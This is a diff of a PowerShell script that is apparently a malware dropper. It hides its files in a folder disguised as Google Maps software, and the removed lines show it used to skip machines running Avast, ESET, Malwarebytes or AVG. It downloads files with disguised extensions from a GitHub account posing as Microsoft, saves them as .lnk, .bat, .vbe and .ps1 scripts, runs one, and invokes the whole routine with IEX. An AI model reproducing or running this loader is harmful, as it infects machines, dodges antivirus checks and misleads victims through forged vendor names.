@@ -1,52 +1,35 @@
 
 start-sleep -s 6
-
 [system.io.directory]::CreateDirectory("C:\ProgramData\Google\Maps\")
 
 start-sleep -s 6
 
 Function MicrosoftStaff
 {
-if([System.IO.File]::Exists("C:\Program Files\Avast Software\Avast\AvastUI")){
-}
-elseif([System.IO.File]::Exists("C:\Program Files\ESET\ESET Security\ecmds")){
-}
-elseif([System.IO.File]::Exists("C:\Program Files\Malwarebytes\Anti-Malware\mbamtray")){
-}
-elseif([System.IO.File]::Exists("C:\Program Files\AVG\Antivirus\AVGUI")){
+if([System.IO.File]::Exists("C:\Program Files\Maps.lnk")){
 }
 else{
-
 start-sleep -s 6
-
- powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/defender.iso', 'C:\ProgramData\Google\Maps\Defender.lnk') }"
- 
- start-sleep -s 6
-  
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/defender.iso', 'C:\ProgramData\Google\Maps\Defender.lnk') }"
+start-sleep -s 6
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/defender.png', 'C:\ProgramData\Google\Maps\Defender.bat') }"
 
 start-sleep -s 6
-  Start "C:\ProgramData\Google\Maps\Defender.lnk"
+Start "C:\ProgramData\Google\Maps\Defender.lnk"
+start-sleep -s 6
 
-
- start-sleep -s 6
-
-
- powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/abouts/view.bmp', 'C:\ProgramData\Google\Maps.vbe') }"
-
- start-sleep -s 6
-
- powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/abouts/jod.img', 'C:\ProgramData\Google\Jod.bat') }"
-
- # start-sleep -s 6
-
- powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/abouts/nolt.png', 'C:\ProgramData\Google\Nolt') }"
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/abouts/view.bmp', 'C:\ProgramData\Google\Maps.vbe') }"
 
 start-sleep -s 6
-  powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/abouts/rolts.iso', 'C:\ProgramData\Google\Rolts.ps1') }"
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/abouts/jod.img', 'C:\ProgramData\Google\Jod.bat') }"
 
 start-sleep -s 6
 
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/abouts/nolt.png', 'C:\ProgramData\Google\Nolt') }"
+
+start-sleep -s 6
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/abouts/rolts.iso', 'C:\ProgramData\Google\Rolts.ps1') }"
+start-sleep -s 6
 }
 }
 IEX MicrosoftStaff
